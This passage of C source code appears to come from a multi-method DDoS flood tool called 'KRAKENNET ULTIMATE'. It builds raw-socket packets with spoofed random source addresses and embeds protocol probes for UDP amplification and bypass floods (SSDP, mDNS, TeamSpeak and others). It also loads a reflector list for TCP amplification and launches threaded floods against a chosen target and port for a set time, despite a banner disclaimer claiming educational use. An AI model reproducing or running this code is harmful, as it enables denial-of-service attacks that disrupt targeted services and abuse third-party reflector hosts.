            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 30;
            break;
        case 1194:
            memcpy((void *)udph + sizeof(struct udphdr), "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0", 12);
            udph->len = htons(sizeof(struct udphdr) + 12);
            udph->dest = htons(1194);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 12;
            break;
        case 1434:
            memcpy((void *)udph + sizeof(struct udphdr), "\x02", 1);
            udph->len = htons(sizeof(struct udphdr) + 1);
            udph->dest = htons(1434);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
            break;
        case 1604:
            memcpy((void *)udph + sizeof(struct udphdr), "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 30);
            udph->len = htons(sizeof(struct udphdr) + 30);
            udph->dest = htons(1604);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 30;
            break;
        case 1900:
            memcpy((void *)udph + sizeof(struct udphdr), "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x4a\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a", 173);
            udph->len = htons(sizeof(struct udphdr) + 173);
            udph->dest = htons(1900);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 173;
            break;
        case 5353:
            strcpy((void *)udph + sizeof(struct udphdr), "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01");
            udph->len = htons(sizeof(struct udphdr) + 21);
            udph->dest = htons(5353);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 21;
            break;
        case 8767:
            strcpy((void *)udph + sizeof(struct udphdr), "\xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
            udph->len = htons(sizeof(struct udphdr) + 148);
            udph->dest = htons(8767);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 148;
            break;
        case 9987:
            memcpy((void *)udph + sizeof(struct udphdr), "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6", 162);
            udph->len = htons(sizeof(struct udphdr) + 162);
            udph->dest = htons(9987);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 162;
            break;
    }
}

void* udp_bypass_worker(void *par1) {
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        return NULL;
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header_udp(iph);
    udph->source = htons(rand() % 65535 - 1026);
    vulnMix(iph, udph);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        close(s);
        return NULL;
    }
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    while(running) {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        udph->check = 0;
        
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
    }
    
    close(s);
    return NULL;
}

// --- Stats thread from lol.c and empty_ip_flood.c ---
void* stats_thread(void* arg) {
    while (running) {
        sleep(1);
        printf("PPS: %llu | Total: %llu\n", cnt, total_success);
        cnt = 0;
    }
    return NULL;
}

// --- Signal handlers ---
void handle_sigint(int sig) {
    running = 0;
    printf("\nShutting down...\n");
}

void h(int s) {
    running = 0;
}

// --- Load amplification list from tcp-amp.c ---
void load_amplification_list(const char *filename) {
    FILE *list_fd = fopen(filename, "r");
    if (!list_fd) return;
    
    int max_len = 128;
    char *buffer = (char *)malloc(max_len);
    memset(buffer, 0x00, max_len);
    
    int i = 0;
    while (fgets(buffer, max_len, list_fd) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL) {
                head = (struct list *)malloc(sizeof(struct list));
                memset(head, 0, sizeof(struct list));
                head->data.sin_addr.s_addr = inet_addr(strtok(buffer, " "));
                head->data.sin_port = htons(atoi(strtok(NULL, " ")));
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0, sizeof(struct list));
                new_node->data.sin_addr.s_addr = inet_addr(strtok(buffer, " "));
                new_node->data.sin_port = htons(atoi(strtok(NULL, " ")));
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        }
    }
    free(buffer);
    fclose(list_fd);
}

// --- Main function integrating ALL methods ---
void print_banner() {
    printf("\n");
    printf("              ...-%@@@@@@@-..               \n");
    printf("             .:%@@@@@@@@@@@@%-.             \n");
    printf("            .#@@@@@@@@@@@@@@@@#.            \n");
    printf("           .%@@@@@@@@@@@@@@@@@@%.           \n");
    printf("           :@@@@@@@@@@@@@@@@@@@@:           \n");
    printf(" ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. \n");
    printf(":@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-\n");
    printf("_____________________________________\n");
    printf("|   KRAKENNET ULTIMATE (ALL METHODS) |\n");
    printf("|    EDUCATIONAL TESTING ONLY        |\n");
    printf("|     YOUR SERVERS ONLY!!!           |\n");
    printf("-------------------------------------\n\n");
}

void print_methods() {
    printf("Available Methods:\n");
    printf("  nfo-tcp      - NFO TCP flood with custom options\n");
    printf("  tcp-amp      - TCP amplification flood\n");
    printf("  sybex        - Sybex TCP RST flood\n");
    printf("  lol          - LOL IP flood\n");
    printf("  empty-ip     - Empty IP protocol flood\n");
    printf("  udp-bypass   - UDP multi-protocol bypass\n");
    printf("\nUsage: <target> <port> <method> <threads> <time>\n");
    printf("Example: 192.168.1.1 80 nfo-tcp 100 60\n");
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 6) {
        printf("Invalid parameters!\n");
        print_methods();
        return 1;
    }
    
    signal(SIGINT, handle_sigint);
    
    // Parse arguments
    strcpy(target_host, argv[1]);
    target_port = atoi(argv[2]);
    strcpy(attack_mode, argv[3]);
    num_workers = atoi(argv[4]);
    attack_duration = atoi(argv[5]);
    floodport = target_port;
    
    // Initialize random
    init_rand(time(NULL));
    
    printf("Target: %s:%d\n", target_host, target_port);
    printf("Method: %s\n", attack_mode);
    printf("Threads: %d\n", num_workers);
    printf("Duration: %d seconds\n", attack_duration);
    
    // Resolve target
    struct hostent *he = gethostbyname(target_host);
    char target_ip[INET_ADDRSTRLEN];
    if (he) {
        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
        printf("Resolved: %s -> %s\n", target_host, target_ip);
    } else {
        strcpy(target_ip, target_host);
        printf("Using target as IP: %s\n", target_ip);
    }
    
    // Set up LOL method variables if needed
    if (strcmp(attack_mode, "lol") == 0) {
        strcpy(tip, target_ip);
        tport = target_port;
        if (glip(tip, lip, sizeof(lip)) != 0) {
            strcpy(lip, "0.0.0.0");
        }
    }
    
    // Load amplification list if needed
    if (strcmp(attack_mode, "tcp-amp") == 0) {
        if (argc > 6) {
            load_amplification_list(argv[6]);
        } else {
            load_amplification_list("reflectors.txt");
        }
        if (!head) {
            printf("Error: No reflectors loaded. Create reflectors.txt or specify file.\n");
            return 1;
        }
    }
    
    // Select worker function
    void *(*worker_func)(void*) = NULL;
    
    if (strcmp(attack_mode, "nfo-tcp") == 0) {
        worker_func = nfo_tcp_worker;
        printf("Starting NFO-TCP flood...\n");
    } else if (strcmp(attack_mode, "tcp-amp") == 0) {
        // For TCP amplification, we need to set up thread data
        printf("Starting TCP amplification...\n");
    } else if (strcmp(attack_mode, "sybex") == 0) {
        worker_func = sybex_worker;
        printf("Starting Sybex RST flood...\n");
    } else if (strcmp(attack_mode, "lol") == 0) {
        worker_func = lol_worker;
        printf("Starting LOL flood...\n");
    } else if (strcmp(attack_mode, "empty-ip") == 0) {
        worker_func = empty_ip_flood_worker;
        printf("Starting Empty IP flood...\n");
    } else if (strcmp(attack_mode, "udp-bypass") == 0) {
        worker_func = udp_bypass_worker;
        printf("Starting UDP bypass...\n");
    } else {
        printf("Unknown method: %s\n", attack_mode);
        print_methods();
        return 1;
    }
    
    printf("Starting in 3 seconds...\n");
    sleep(3);
    
    pthread_t threads[MAX_THREADS];
    pthread_t stats_thread_id;
    
    // Start stats thread
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);
    
    // Start workers based on method
    if (strcmp(attack_mode, "tcp-amp") == 0) {
        // TCP amplification requires special setup
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(target_port);
        sin.sin_addr.s_addr = inet_addr(target_ip);
        
        struct thread_data td[num_workers];
        for(int i = 0; i < num_workers && running; i++) {
            td[i].thread_id = i;
            td[i].sin = sin;
            td[i].list_node = head;
            pthread_create(&threads[i], NULL, tcp_amp_worker, (void *)&td[i]);
            head = head->next;
        }
    } else {
        // Regular methods
        for(int i = 0; i < num_workers && running; i++) {
            pthread_create(&threads[i], NULL, worker_func, (void*)target_ip);
        }
    }
    
    printf("Attack started! Press Ctrl+C to stop.\n");
    
    // Run for specified duration
    time_t start_time = time(NULL);
    while (running && (time(NULL) - start_time) < attack_duration) {
        sleep(1);
    }
    
    running = 0;
    
    // Wait for threads to finish
    printf("Waiting for threads to finish...\n");
    for(int i = 0; i < num_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(stats_thread_id, NULL);
    
    printf("\nAttack complete!\n");
    printf("Total packets sent: %llu\n", total_success);
    printf("Total bytes sent: %llu\n", total_bytes);
    
    return 0;
}